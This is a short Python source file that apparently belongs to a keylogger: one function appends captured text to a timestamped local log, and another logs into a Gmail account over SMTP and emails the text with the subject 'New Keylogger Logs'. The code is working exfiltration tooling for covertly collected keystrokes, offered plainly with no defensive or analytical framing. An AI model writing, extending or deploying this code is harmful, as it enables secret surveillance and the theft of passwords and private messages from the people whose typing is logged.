import smtplib, time


def save_text_locally(text, file_path):
    try:
        file = open(file_path, "r")
        file.close()
        file = open(file_path, "a", encoding="utf-8")
    except:
        try:
            file = open(file_path, "a", encoding="utf-8")
            file.write("-"*10 + "{0} {1}".format(time.strftime("%d/%m/%Y"), time.strftime("%I:%M:%S")) + "-"*10 + "\n")
        except:
            return False

    file.write("")
    file.write(text)
    file.close()

    return True


def send_gmail(text, email, password):
    email_content = "Subject: {}\n\n{}".format(f"New Keylogger Logs", text)

    try:
        smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        smtp_server.ehlo()  # identifies you to the smtp server
        smtp_server.login(email, password)
        smtp_server.sendmail(email, email, email_content)
        smtp_server.close()
        return True
    except:
        return False
